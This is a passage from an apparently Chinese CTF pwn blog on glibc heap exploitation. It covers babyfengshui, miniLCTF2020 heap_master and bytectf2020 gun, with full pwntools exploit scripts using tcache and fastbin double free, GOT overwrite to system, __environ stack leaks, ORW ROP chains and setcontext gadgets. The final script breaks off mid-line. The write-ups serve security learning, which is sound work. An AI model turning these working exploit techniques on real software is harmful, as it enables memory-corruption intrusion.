remote(&#x27;node3.buuoj.cn&#x27;,26486)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, name, length:<span class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size of description: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;name: &quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, length:<span class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    big_size = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span></span><br><span class="line">    padding_length = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">    new(big_size, <span class="string">&quot;arttnba3&quot;</span>, padding_length + <span class="number">4</span>, <span class="string">b&#x27;A&#x27;</span> * padding_length + p32(e.got[<span class="string">&#x27;free&#x27;</span>])) <span class="comment"># idx 3</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;description: &quot;</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x10</span>, p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png" alt="image.png"></p>
<h2 id="八、ROP-in-heap-exploit"><a href="#八、ROP-in-heap-exploit" class="headerlink" title="八、ROP in heap exploit"></a>八、ROP in heap exploit</h2><p>在堆题的世界并非只能够通过劫持各种 hook 来达到控制程序执行流的效果，传<strong>统的在栈上构造 ROP 链的方式仍旧未过时</strong>，利用各种 pwn 技巧我们仍旧可以通过在栈上构造 ROP 链的方式控制程序执行流</p>
<h3 id="environ"><a href="#environ" class="headerlink" title="__environ"></a>__environ</h3><p><code>__environ</code> 是一个<strong>保存了栈上变量地址的系统变量</strong>，位于 libc 中，利用 gdb 调试我们可以很方便地得知其与栈上地址间的偏移，以此在栈上构造 ROP 链劫持程序执行流</p>
<h4 id="例题：miniLCTF2020-heap-master-tcache-double-free-use-after-free-orw"><a href="#例题：miniLCTF2020-heap-master-tcache-double-free-use-after-free-orw" class="headerlink" title="例题：miniLCTF2020 - heap_master - tcache double free(use after free) + orw"></a>例题：miniLCTF2020 - heap_master - tcache double free(use after free) + orw</h4><p> <a href="/download/minil/pwn/pwn%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">点击下载-pwn</a> </p>
<p>惯例的<code>checksec</code>，发现除了地址随机化以外都开上了</p>
<p><img src="https://i.loli.net/2020/11/15/biBCsTKHSuj4l9f.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/11/15/sFaTZAYb5oqDU3I.png" alt="image.png"></p>
<p>程序本身有着分配堆块、释放堆块、输出堆块内容的功能</p>
<p>我们发现在<code>delete()</code>函数中<code>free()</code>后<strong>并没有将相应堆块指针置0，存在UAF</strong></p>
<p><img src="https://i.loli.net/2020/11/15/Ua3OnZdlLFswe48.png" alt="image.png"></p>
<p>题目提示libc可能是2.23也可能是2.27，尝试<strong>直接进行double free，发现程序没有崩溃</strong>，故可知是没有double free检查的2.27的tcache</p>
<blockquote>
<p>libc2.29后tcache加入double free检查</p>
</blockquote>
<p><img src="https://i.loli.net/2020/11/15/yF7H8SBxf9mJcAb.png" alt="image.png"></p>
<p>在<code>main()</code>函数开头的<code>init()</code>函数中调用了<code>prctl()</code>函数，限制了我们不能够getshell<img src="https://i.loli.net/2020/11/19/q3Jaw8BfEYjGUNd.png" alt="image.png"></p>
<p>首先我们想到，我们可以先填满tcache，之后分配一个unsorted bin范围的chunk，通过打印该chunk的内容获取<strong>main_arena + 0x60</strong>的地址，<strong>进而获得libc的地址</strong></p>
<p>虽然我们不能够 getshell，但是依然可以通过 double free 进行任意地址写，<del>毕竟CTF题目的要求是得到flag，不一定要得到shell，</del>故考虑<strong>通过 environ 变量泄漏出栈地址后在栈上构造 rop 链进行 orw 读出flag</strong></p>
<p>通过动态调试我们容易得到<code>___environ</code>与<code>new()</code>中的返回地址间距离为0x220，<strong>将rop链写到这个返回地址上即可接收到flag</strong></p>
<p><img src="https://i.loli.net/2020/11/20/auVAHxCbtO6IUjm.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/11/20/ULcoXK4GiISg6Vb.png" alt="image.png"></p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>) <span class="comment"># p = remote(&#x27;pwn.challenge.lctf.online&#x27;,10042)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">note_addr = <span class="number">0x6020c0</span></span><br><span class="line">flag_addr = e.bss() + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;size?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content?&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index ?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index ?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;what is your name? &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin leak libc addr</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] <span class="comment"># 0x3cbc30</span></span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">&#x27;__environ&#x27;</span>] <span class="comment"># 0x3ee098</span></span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># double free in tcache 2</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite node[0]</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(note_addr)) <span class="comment"># idx 4, former 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5, former 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(environ))<span class="comment"># idx 6, locate at the note[0] and overwrite it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak stack addr</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    stack_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    ret = stack_leak - <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain</span></span><br><span class="line">    payload = p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">4</span>) + p64(e.plt[<span class="string">&#x27;read&#x27;</span>]) <span class="comment"># read str &#x27;flag&#x27; from input</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])<span class="comment"># open file &#x27;flag&#x27;</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(e.plt[<span class="string">&#x27;read&#x27;</span>])<span class="comment"># read flag from file ptr 3(opened by open())</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># double free write rop chain on stack</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    new(<span class="number">0xb0</span>, p64(ret))<span class="comment"># idx 7, former 3</span></span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 8, former 3</span></span><br><span class="line">    new(<span class="number">0xb0</span>, payload) <span class="comment"># idx 9, locate on the stack</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    p.send(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行脚本即得flag</p>
<p><img src="https://i.loli.net/2020/11/20/FcWrg87oXnbLCMz.png" alt="image.png"></p>
<h3 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h3><p>setcontext函数是libc中一个独特的函数，其中存在着一个可以让我们控制各寄存器的gadget，如下图所示（来自<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-263640.htm">ScUpax0s -  字节跳动ByteCTF2020 两道堆题 </a>）</p>
<p><img src="https://s3.ax1x.com/2020/11/20/DQ7UyV.png" alt="DQ7UyV.png"></p>
<p>只要我们能够控制 rdi 寄存器，在特定的位置构造一个  <code>ucontext_t</code>结构体 ，执行setcontext + 61位置上的gadget，就能通过类似 SROP 的过程控制进程各寄存器的值，随后就是栈迁移 + ROP一套带走</p>
<p>通常情况下选择在堆上构造 <code>ucontext_t</code>结构体，劫持__free_hook为以下gadget：</p>
<p><img src="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png" alt="image.png"></p>
<p>这个 gadget 一般在这个函数里</p>
<p><img src="https://i.loli.net/2021/05/06/YAkOqJIzrUnFLN9.png" alt="image.png"></p>
<h4 id="例题：bytectf2020-gun-Use-After-Free-fastbin-double-free-ORW"><a href="#例题：bytectf2020-gun-Use-After-Free-fastbin-double-free-ORW" class="headerlink" title="例题：bytectf2020 - gun - Use After Free + fastbin double free + ORW"></a>例题：bytectf2020 - gun - Use After Free + fastbin double free + ORW</h4><p><a href="/download/bytectf2020/pwn/gun/gun" title="点击此处下载原题">点击下载-gun</a></p>
<p><a href="/download/bytectf2020/pwn/gun/libc-2.31.so" title="点击此处下载原题">点击下载-libc-2.31.so</a></p>
<p>惯例的<code>checksec</code>，保护全开（<del>大比赛的堆题好像都是保护全开，已经没有checksec的必要了</del>）</p>
<p><img src="https://i.loli.net/2020/12/08/Kaw5yg3udnEVMBp.png" alt="image.png"></p>
<p>拖入IDA进行分析<del>，IDA分析出一坨shit</del></p>
<p>符号表扣光，啥都看不出（悲）</p>
<p><img src="https://i.loli.net/2020/12/08/H5EqnWwVeCjIKh6.png" alt="image.png"></p>
<p>seccomp限制了一堆东西，琢磨着应该是拿不到shell了，应该还是只能走orw拿弗莱格</p>
<p><img src="https://i.loli.net/2020/12/08/EmitBpFlnNKP7X9.png" alt="image.png"></p>
<p>程序模拟了一把枪，能够射出、装载、购买子弹，其中子弹对应的就是chunk，购买子弹对应malloc</p>
<p><img src="https://i.loli.net/2021/02/05/wxq2SRUBbMs5mcl.png" alt="image.png"></p>
<p>最多能够分配14个堆块，空间充足（x</p>
<p><img src="https://i.loli.net/2021/02/05/94rFSObq7T3h6zI.png" alt="image.png"></p>
<p>在<code>buy()</code>函数中限制了chunk的size为0x10~0x500（似乎没什么用）</p>
<p><img src="https://i.loli.net/2021/02/06/eqmvJSHc7I3YDin.png" alt="image.png"></p>
<p>其中<code>qword_4070</code>存放的是子弹槽对应标志位，0为该槽子弹已被射出（free），1为该槽已被使用（存放有chunk指针），2为该槽子弹已被装载（链入”弹匣“单向链表中）</p>
<p>综合起来我们不难看出其使用一个结构体来表示一个“子弹”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_BULLET_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * name;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> flag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_BULLET_</span> * <span class="title">next_bullet</span>;</span></span><br><span class="line">&#125;bullet;</span><br></pre></td></tr></table></figure>

<p>其中<code>成员name</code>储存的便是chunk指针</p>
<p>在<code>load()</code>函数中会使用头插法构建”弹匣“（单向链表），其中会使用chunk的bk指针存储原链表中头结点</p>
<p><img src="https://i.loli.net/2021/02/05/MbjAFZzscO56dhE.png" alt="image.png"></p>
<p>在<code>shoot()</code>函数中会依次将”弹匣“链表上的”子弹”释放，随后会将该子弹的flag置0，<strong>但是没有清空其next_chunk指针，存在 Use After Free 漏洞，对于子弹链表的不严格检测可以导致double free</strong></p>
<p>同时shoot函数还整合了打印堆块内容的功能，利用这个功能我们可以通过再分配后二次释放的方式通过chunk上残留指针泄露 libc 基址与堆基址</p>
<p><img src="https://i.loli.net/2021/02/06/7FxncCbzOGshmBe.png" alt="image.png"></p>
<p>由于题目所给的 libc 版本为 2.31，添加了对 tcache key 的检测，无法直接在 tcache 内进行 double free，故考虑<strong>先填满 tcache 后在 fastbin 内 double free，后通过 stash 机制清空 tcache 使得 fastbin 内形如 A-&gt;B-&gt;A 的 chunk 倒入 tcache 中，实现任意地址写</strong>，这种做法<strong>不需要通过 fastbin 的 size 检查</strong></p>
<p>同时由于程序本身限制了系统调用，我们只能通过orw读取flag</p>
<p>考虑通过<code>setcontext()</code>中的gadget进行控制寄存器，同时我们还需要控制rdx寄存器，考虑劫持__free_hook后通过libc中如下gadget控制rdx后跳转至setcontext函数内部：</p>
<p><img src="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png" alt="image.png"></p>
<p>最后通过setcontext构建的rop链orw即可，使用pwntools中的<code>SigreturnFrame()</code>可以快速构造 <code>ucontext_t</code>结构体 </p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gun&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gun&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Action&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shoot</span>(<span class="params">times:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Shoot time: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(times).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Which one do you want to load?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Bullet price: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Bullet Name: &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&quot;arttnba3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    buy(<span class="number">0x10</span>, <span class="string">b&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    buy(<span class="number">0x500</span>, <span class="string">b&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    buy(<span class="number">0x10</span>, <span class="string">b&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">1168</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap addr</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;AAAAAAAAAAAAAAAA&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAA&#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;heap addr leak: &#x27;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line">    heap_base = heap_leak &amp; <span 